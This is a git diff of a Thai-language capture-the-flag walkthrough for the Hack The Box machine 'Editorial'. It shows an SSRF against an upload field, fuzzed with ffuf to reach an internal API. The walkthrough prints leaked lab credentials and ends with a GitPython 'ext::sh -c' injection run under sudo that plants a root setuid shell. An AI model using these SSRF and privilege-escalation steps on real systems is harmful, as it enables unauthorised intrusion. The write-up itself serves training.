@@ -1,3 +1,4 @@
+
 ## Host Scan
 
 ```bash
@@ -18,29 +19,31 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://editorial.htb
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.13 seconds
 
 ```
 
-![[Challenge/HTB Challenge/Editorial/IMG/001.png]]
+
+
+![](./IMG/001.png)
 
 ```bash
 nc -lvnp 80
 ```
 
 หากสำรวจเว็บจะพบว่ามีหน้า Publish with us ที่สามารถใส่ URL และสามารถ Upload ไฟล์ได้ ซึ่งหากลองทดอสอบใส่ข้อมูลตามภาพแล้วกด Preview จะพบว่ามี Connection ตอบกลับมาที่ nc ที่ได้ตั้งไว้ 
-![[Challenge/HTB Challenge/Editorial/IMG/002.png]]
+![](./IMG/002.png)
 
-![[Challenge/HTB Challenge/Editorial/IMG/003.png]]
+![](./IMG/003.png)
 
 จากนั้นไปดูข้อมูลของ Request และเปลี่ยนข้อมูลเป็น 127.0.0.1 พบว่ามีการใช้งาน API  หลังบ้าน 
-![[Challenge/HTB Challenge/Editorial/IMG/004.png]]
+![](./IMG/004.png)
 
 
 หากทดสอบ upload ข้อมูลผ่านช่อง url โดยเปิดให้สามารถ download ได้จะพบว่าสามารถ Upload ไปที่ API ปลายทางได้ 
 
-![[Challenge/HTB Challenge/Editorial/IMG/005.png]]
+![](./IMG/005.png)
 
 จากข้อมูลดังกล่าวเป็นการโจมตีรูปแบบ SSRF ซึ่งเราจำเป็นต้องหาให้ได้ว่า Port ใดที่มีช่องโหว่ โดยเราสามารถนำ Request มาแก้ไขดังต่อไปนี้ 
 
@@ -78,19 +81,19 @@ Content-Type: application/octet-stream
 ffuf -u http://editorial.htb/upload-cover -request ssrf.request -w <( seq 0 65535) -ac -c 
 ```
 
-![[Challenge/HTB Challenge/Editorial/IMG/006.png]]
+![](./IMG/006.png)
 
 จากตัวอย่างจะเห็นได้ว่า Port 5000 มีช่องโหว่ ซึ่งหากเราทดสอบ Request ด้วย http://127.0.0.1:5000 และนำข้อมูลที่ตอบกลับไปรันด้วยคำสั่ง crul จะพบการตอบกลับมาดังต่ไปนี้ 
 
-![[Challenge/HTB Challenge/Editorial/IMG/007.png]]
+![](./IMG/007.png)
 
 เราสามารถตรวจสอบโดยการนำข้อมูลไปใส่ในช่อง URL: http://127.0.0.1:5000 จะได้ข้อมูล API มาด้านล่าง
 
-![[Challenge/HTB Challenge/Editorial/IMG/008.png]]
+![](./IMG/008.png)
 
 หากทดสอบโดยใช้ URL ที่ได้จากก่อนหน้า เช่น http://127.0.0.1:5000/api/latest/metadata/messages/authors  เราก็จะได้ข้อมูลกลับมาตามภาพด้านล่าง 
 
-![[Challenge/HTB Challenge/Editorial/IMG/009.png]]
+![](./IMG/009.png)
 
 ซึ่งจากข้อมูลนี้ทำให้เราได้ User และ password ดังนี้ 
 
@@ -116,7 +119,7 @@ dev:dev080217_devAPI!@
 ## PWN to SSH 
 
 จากนั้นนำข้อมูลที่ได้ไปทดสอบเข้าด้วย SSH 
-![[Challenge/HTB Challenge/Editorial/IMG/010.png]]
+![](./IMG/010.png)
 
 เมื่อเข้ามาจะพบกับ Folder App ที่มีไฟล์ .GIT
 
@@ -126,7 +129,7 @@ git log
 
 จากตัวอย่างจะเห็นได้ว่ามีข้อความเกี่ยวกับการ Downgrade ของระบบอยู่ 
 
-![[Challenge/HTB Challenge/Editorial/IMG/011.png]]
+![](./IMG/011.png)
 
 ให้ทำการเปรียบเทียบ version ของทั้ง 2 Commit 
 
@@ -134,7 +137,7 @@ git log
 git diff b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae 1e84a036b2f33c59e2390730699a488c65643d28
 ```
 
-![[Challenge/HTB Challenge/Editorial/IMG/012.png]]
+![](./IMG/012.png)
 
 จากข้อมูลจะเห็นได้ว่า มีข้อมูลของ Credential หลุดไป 
 
@@ -143,7 +146,7 @@ nUsername: prod
 Password: 080217_Producti0n_2023!@
 ```
 
-![[Challenge/HTB Challenge/Editorial/IMG/013.png]]
+![](./IMG/013.png)
 
 จากนั้น sudo -l จะพบว่ามีไฟล์ /opt/internal_apps/clone_changes/clone_prod_change.py 
 
@@ -173,7 +176,7 @@ prod@editorial:~$
 
 ```
 
-![[Challenge/HTB Challenge/Editorial/IMG/014.png]]
+![](./IMG/014.png)
 
 
 https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858
@@ -192,7 +195,7 @@ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext
 ```
 
 
-![[Challenge/HTB Challenge/Editorial/IMG/015.png]]
+![](./IMG/015.png)
 
 จากตัวอย่างจะเห็นว่าเราสามารถใช้คำสั่ง touch สำหรับสร้างไฟล์ pwned บน /tmp ได้ 
 
@@ -202,17 +205,9 @@ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext
 
 
 ```bash
-echo -e '#!/bin/bash
+echo -e '#!/bin/bash\n\ncp /bin/sh /tmp/ice\nchown root:root /tmp/ice\nchmod 6777 /tmp/ice' 
 
-cp /bin/sh /tmp/ice
-chown root:root /tmp/ice
-chmod 6777 /tmp/ice'
-
-echo -e '#!/bin/bash
-
-cp /bin/sh /tmp/ice
-chown root:root /tmp/ice
-chmod 6777 /tmp/ice' > /dev/shm/ice.sh 
+echo -e '#!/bin/bash\n\ncp /bin/sh /tmp/ice\nchown root:root /tmp/ice\nchmod 6777 /tmp/ice' > /dev/shm/ice.sh 
 
 chmod +x /dev/shm/ice.sh
 
@@ -224,4 +219,3 @@ sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c /
 ```
 
 # PWNED 
-```
